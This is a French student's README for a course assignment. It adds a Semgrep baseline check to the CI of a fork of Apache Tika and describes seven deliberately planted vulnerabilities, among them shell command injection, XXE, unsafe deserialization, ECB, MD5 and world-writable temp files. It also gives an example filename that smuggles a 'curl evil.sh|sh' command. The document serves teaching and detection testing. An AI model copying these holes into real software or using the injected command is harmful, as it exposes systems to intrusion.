# IFT3913 – Tâche 3 : Semgrep dans le CI, vulnérabilités et rickroll

Nizar Lakhder (`NizarLakhder`), travail fait seul.

- Dépôt : https://github.com/NizarLakhder/tika (fork de [umontreal-diro/tika](https://github.com/umontreal-diro/tika))
- Workflow : [`.github/workflows/main-jdk17-build.yml`](.github/workflows/main-jdk17-build.yml)
- Action rickroll : [`.github/actions/rickroll/`](.github/actions/rickroll/)
- Rapports Semgrep : [`tache3/`](tache3/)

## 1. Faire échouer le build sur une nouvelle vulnérabilité

### 1.1 Ce que j'ai changé

`main jdk17 build` est le build principal : il compile et teste tout Tika à chaque push et à chaque pull request. J'y ai ajouté un job `semgrep` qui passe en premier, et j'ai rendu le job `build` dépendant de lui (`needs: semgrep`). L'idée est simple : dès qu'un commit introduit une vulnérabilité qui n'était pas là avant, le job `semgrep` échoue et ni `build` ni `e2e-tests` ne démarrent.

Tout tient dans une commande :

```yaml
semgrep scan --config p/default --config p/java --metrics=off \
  --baseline-commit "$BASELINE" --error \
  --json-output=semgrep-new.json --sarif-output=semgrep-new.sarif
```

Chaque nouveau résultat ressort en annotation directement sur la ligne concernée, avec un récapitulatif dans le résumé de l'exécution et les rapports JSON et SARIF joints en artefact.

### 1.2 Pourquoi comme ça

Le vrai piège, c'est que Tika contient déjà 82 résultats Semgrep, en grande majorité des faux positifs. Si je faisais échouer le build sur tout, plus aucun commit ne passerait. C'est pour ça que j'utilise `--baseline-commit` : Semgrep compare le code actuel à une version de référence et ne garde que ce qui est réellement nouveau. La comparaison porte sur la règle et le code, pas sur le numéro de ligne, donc déplacer du code existant ne déclenche pas de fausse alerte.

Le reste des décisions :

- **La référence** est la base de la PR pour une pull request, et `github.event.before` (l'état de `main` juste avant le push) pour un push, avec `HEAD^` en secours si ce commit est introuvable.
- **J'active deux jeux de règles**, `p/default` et `p/java`, parce qu'aucun ne suffit seul : `p/java` ne voit ni l'injection de commande, ni la désérialisation, ni l'aléatoire faible, et `p/default` ne voit ni MD5 ni la XXE par `SAXParserFactory`.
- **Le scan passe avant le build**, qui dure une heure là où lui prend une minute : un commit fautif est recalé tout de suite, sans gaspiller le CI.
- **Si Semgrep plante** (registre injoignable, par exemple), le build échoue quand même. Une barrière qui laisse passer en silence ne sert à rien.
- **Le workflow s'applique ses propres règles** : version de Semgrep figée, actions épinglées par SHA, contexte GitHub passé par variables d'environnement, permissions réduites à `contents: read`.

### 1.3 Comment je l'ai validé

J'ai rejoué chaque situation en local (Semgrep 1.185.0, mêmes règles), dans un clone où chaque cas est un commit :

| Cas | Comparé à | Nouveaux | Sortie |
|---|---|---|---|
| A. Job `semgrep` + action rickroll | tâche 2 | 0 | 0 |
| B. Les 7 vulnérabilités | A | 7 | échec |
| C. Documentation | B | 0 | 0 |
| D. Ligne ajoutée dans un fichier déjà signalé pour XXE | C | 0 | 0 |
| E. Action non épinglée ajoutée au workflow | C | 1 | échec |

Les cas qui comptent le plus : **C** montre qu'une vulnérabilité déjà connue ne rebloque pas le build une fois passée dans la référence, **D** qu'un résultat simplement déplacé n'est pas compté comme neuf, et **E** que la barrière se protège elle-même. Sur GitHub, ça se rejoue en trois push : vert, puis rouge avec 7 annotations, puis de nouveau vert.

## 2. Les 7 vulnérabilités

J'ai placé chaque faille là où Tika manipule une donnée qu'un attaquant contrôle (un document, un nom de fichier, un message réseau) ou un mécanisme censé le protéger (fichier temporaire, jeton, empreinte). À chaque fois, le comportement normal reste le même — c'est pour ça que les tests continuent de passer — et la ligne modifiée porte le commentaire `IFT3913 task 3 - intentional vulnerability`. Les sept fichiers appartiennent tous aux modules du cas d'étude : `tika-core`, `tika-serialization`, `tika-parser-microsoft-module` et `tika-parser-ocr-module`.

| # | Type (CWE) | Fichier | Règle Semgrep |
|---|---|---|---|
| 1 | Injection de commande (CWE-78) | [`FileCommandDetector.java`](tika-core/src/main/java/org/apache/tika/detect/FileCommandDetector.java) | `command-injection-process-builder` |
| 2 | Chiffrement faible (CWE-327) | [`CryptoParser.java`](tika-core/src/main/java/org/apache/tika/parser/CryptoParser.java) | `ecb-cipher` |
| 3 | XXE (CWE-611) | [`AbstractXML2003Parser.java`](tika-parsers/tika-parsers-standard/tika-parsers-standard-modules/tika-parser-microsoft-module/src/main/java/org/apache/tika/parser/microsoft/xml/AbstractXML2003Parser.java) | `saxparserfactory-disallow-doctype-decl-missing` |
| 4 | Désérialisation non sûre (CWE-502) | [`JsonMetadata.java`](tika-serialization/src/main/java/org/apache/tika/serialization/JsonMetadata.java) | `object-deserialization` |
| 5 | Aléatoire prévisible (CWE-330) | [`TesseractOCRParser.java`](tika-parsers/tika-parsers-standard/tika-parsers-standard-modules/tika-parser-ocr-module/src/main/java/org/apache/tika/parser/ocr/TesseractOCRParser.java) | `weak-random` |
| 6 | Permissions trop larges (CWE-276) | [`TemporaryResources.java`](tika-core/src/main/java/org/apache/tika/io/TemporaryResources.java) | `overly-permissive-file-permission` |
| 7 | Hachage faible (CWE-328) | [`InputStreamDigester.java`](tika-core/src/main/java/org/apache/tika/digest/InputStreamDigester.java) | `use-of-md5` |

**1. Injection de commande.** `FileCommandDetector` appelle la commande système `file` sur le fichier à analyser, et ce chemin vient très souvent de l'extérieur. J'ai remplacé le tableau d'arguments d'origine par un `sh -c` construit par concaténation : un fichier nommé `rapport;curl evil.sh|sh;.pdf` fait désormais exécuter `curl`.

**2. Chiffrement faible.** `CryptoParser` déchiffre un document avant de le confier au parseur suivant, selon la transformation configurée. J'ai ajouté un repli : quand aucune transformation n'est fournie, le code retombe sur `AES/ECB/PKCS5Padding`. Le mode ECB chiffre deux blocs identiques de la même façon, donc il laisse transparaître la structure du document déchiffré.

**3. XXE.** `AbstractXML2003Parser` lit les documents Office 2003 au format XML (Word, Excel), donc du contenu fourni par l'attaquant. Au lieu de passer par `XMLReaderUtils` (qui interdit les DTD), j'utilise un `SAXParserFactory` par défaut, qui résout les entités externes : un document piégé peut alors lire un fichier local (`file:///etc/passwd`) ou faire émettre une requête par le serveur.

**4. Désérialisation non sûre.** `JsonMetadata` lit et écrit des métadonnées. J'ai ajouté une méthode `fromBytes` qui, pour un message commençant par `0xACED`, le lit avec `ObjectInputStream.readObject()` — lequel instancie n'importe quelle classe présente dans le flux avant tout contrôle de type, un point d'entrée idéal pour une chaîne de gadgets.

**5. Aléatoire prévisible.** `TesseractOCRParser` crée un fichier temporaire pour recevoir la sortie de Tesseract. Je génère son nom avec `java.util.Random` au lieu d'un fichier temporaire sécurisé : le nom devient prévisible, donc un utilisateur local peut deviner ou pré-créer le chemin (attaque par lien symbolique / TOCTOU sur la sortie OCR).

**6. Permissions trop larges.** `TemporaryResources` crée la copie temporaire de chaque document analysé. Au lieu de la laisser en `rw-------`, je lui mets des droits `rw-rw-rw-` : n'importe quel utilisateur local peut alors la lire, ou en remplacer le contenu entre son écriture et son analyse.

**7. Hachage faible.** `InputStreamDigester` calcule les empreintes demandées dans la configuration (SHA-256, SHA-512…), utilisées pour la déduplication ou le contrôle d'intégrité. Si l'algorithme demandé n'est pas disponible, je le fais basculer en silence sur MD5, tout en gardant le nom d'origine : or les collisions MD5 sont faisables, donc deux documents différents peuvent partager la même empreinte.

## 3. Avant / après

- [`tache3/semgrep-avant.json`](tache3/semgrep-avant.json) : 82 résultats, sans les vulnérabilités ;
- [`tache3/semgrep-apres.json`](tache3/semgrep-apres.json) : 88 résultats, avec les 7 vulnérabilités.

Six règles gagnent chacune un résultat : `ecb-cipher` (0 → 1), `object-deserialization` (0 → 1), `overly-permissive-file-permission` (0 → 1), `saxparserfactory-disallow-doctype-decl-missing` (1 → 2), `use-of-md5` (0 → 1) et `weak-random` (0 → 1). On retrouve bien six des sept failles.

La septième, l'injection de commande, est plus subtile : elle **n'augmente pas** le total, parce que `command-injection-process-builder` reste à 16. Le code d'origine, `new ProcessBuilder(args)`, était déjà signalé — mais à tort, puisqu'un tableau d'arguments ne passe pas par un shell. Ma version `new ProcessBuilder("sh", "-c", ...)` remplace ce faux positif par une vraie injection : un résultat retiré, un ajouté, total identique.

C'est exactement pour cette raison que le CI compare les résultats plutôt que leur nombre. En comptant, l'après ne gagne que 6 résultats (82 → 88) et la septième faille passerait inaperçue. Le mode `--baseline-commit`, lui, compare chaque résultat par sa règle et son code : il voit disparaître l'ancien `ProcessBuilder(args)` et apparaître le nouveau, et rapporte donc bien **7 nouvelles vulnérabilités** (le cas B de la section 1.3).

## 4. Rickroll quand un test échoue

L'action composite [`.github/actions/rickroll/`](.github/actions/rickroll/) est ma propre implémentation. Le workflow l'appelle après Maven, dans `build` et `e2e-tests` :

```yaml
- name: Rickroll
  if: failure() && steps.maven.outcome == 'failure'
  uses: ./.github/actions/rickroll
```

Le script [`rickroll.py`](.github/actions/rickroll/rickroll.py) lit les rapports JUnit de Surefire et Failsafe. Pour chaque test en échec, il pose une annotation « Rickrolled by *test* » avec le lien de la vidéo et ajoute une miniature cliquable au résumé. S'il n'y a aucun test en échec (l'échec vient de la compilation ou de Checkstyle), pas de rickroll — l'énoncé le réserve aux tests. L'action se réutilise partout (`uses: ./.github/actions/rickroll` ou `@main`) et prend deux entrées, `reports` et `video-id`.

Je l'ai d'abord testée en local sur des rapports contenant un succès, un échec, une erreur et un test instable. Sur GitHub, une pull request avec une assertion volontairement fausse dans `EndianUtilsTest` fait réussir `semgrep`, échouer `build` et apparaître le rickroll ; cette PR ne sert qu'à la démonstration et n'est pas fusionnée.

## 5. Refaire le scan

```bash
pip install semgrep==1.185.0
# ce que fait le CI : seulement les résultats absents du commit de référence
semgrep scan --config p/default --config p/java --metrics=off --baseline-commit <sha> --error
```

## 6. Utilisation de l'intelligence artificielle

J'ai utilisé Claude Code (Anthropic, Opus 4.8) les 15 et 16 novembre 2026 pour m'aider dans certaines parties de ce travail. J'ai réalisé le projet moi-même, notamment le choix des modules, l'ajout des 7 vulnérabilités et l'organisation du travail. Claude m'a surtout servi à vérifier les vulnérabilités que j'avais introduites, à m'assurer que les chiffres des analyses Semgrep étaient cohérents et à améliorer la rédaction de ma documentation. Je l'ai également utilisé pour reformuler certains passages et rendre mes explications plus claires. J'ai pris le temps de relire et de vérifier les résultats ainsi que les modifications proposées avant de les garder dans mon travail.

Voici deux exemples de demandes que j'ai faites à l'IA, reformulées :

- Documentation : « Voici mes 7 vulnérabilités et les rapports Semgrep avant/après. Aide-moi à les expliquer clairement dans le README. »
- Vérification : « Voici les chiffres du scan avant/après. Peux-tu vérifier leur cohérence et repérer les incohérences dans mes explications ? »
